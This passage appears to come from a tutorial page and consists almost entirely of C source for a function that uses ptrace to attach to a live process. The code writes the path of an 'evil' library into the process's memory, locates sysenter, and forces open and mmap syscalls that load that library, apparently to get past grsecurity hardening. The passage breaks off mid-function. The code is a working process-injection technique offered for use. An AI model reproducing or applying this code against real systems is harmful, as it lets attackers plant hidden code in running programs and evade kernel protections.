<p>Lets take a look at our code:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> grsec_mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx, orig_eax, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> syscall;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status, fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> library_string<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> orig_ds<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span> = <span style="color: black;">{</span><span style="color: #cc66cc;">0</span><span style="color: black;">}</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tmp<span style="color: black;">[</span><span style="color: #cc66cc;">8192</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> open_done = <span style="color: #cc66cc;">0</span>, mmap_done = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> int80 = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> sysenter = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; strcpy<span style="color: black;">(</span>library_string, EVILLIB_FULLPATH<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* backup first part of data segment which will use for a string and some vars */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>orig_ds, data_segment, strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: #cc66cc;">+32</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* store our string for our evil lib there */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>library_string + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* verify we have the correct string */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i+= <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span>&amp;buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>buf, EVILLIB_FULLPATH<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Verified string is stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"String was not properly stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SYSCALL, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> syscall_eip = reg.<span style="color: #202020;">eip</span> - <span style="color: #cc66cc;">20</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this gets sysenter dynamically incase its randomized */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!static_sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, syscall_eip, <span style="color: #cc66cc;">20</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">20</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!<span style="color: black;">(</span>i % <span style="color: #cc66cc;">10</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, tmp<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i + <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = syscall_eip + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this works only if sysenter isn't at random location */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, 0xffffe000, <span style="color: #cc66cc;">8192</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">8192</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = 0xffffe000 + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; sysenter -= <span style="color: #cc66cc;">5</span>;<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unable to find sysenter<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Sysenter found: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, sysenter<span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sysenter should point to: <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;%esp,%ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter <br>
&nbsp; &nbsp; &nbsp; &nbsp; */</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_open;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = <span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span>data_segment;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = <span style="color: #cc66cc;">0</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_open<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = <span style="color: black;">(</span>data_segment + strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: black;">)</span> + <span style="color: #cc66cc;">8</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* MAP IN TEXT RE */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, segment.<span style="color: #202020;">text_len</span> + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>segment.<span style="color: #202020;">text_len</span> &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, segment.<span style="color: #202020;">text_off</span> &amp; ~<span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_mmap<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* MAP IN DATA RW */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, segment.<span style="color: #202020;">data_len</span> + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>segment.<span style="color: #202020;">data_len</span> &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">3</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT_WRITE</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, segment.<span style="color: #202020;">data_off</span> &amp; ~<span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Restoring data segment<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span> + <span style="color: #cc66cc;">32</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>orig_ds + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
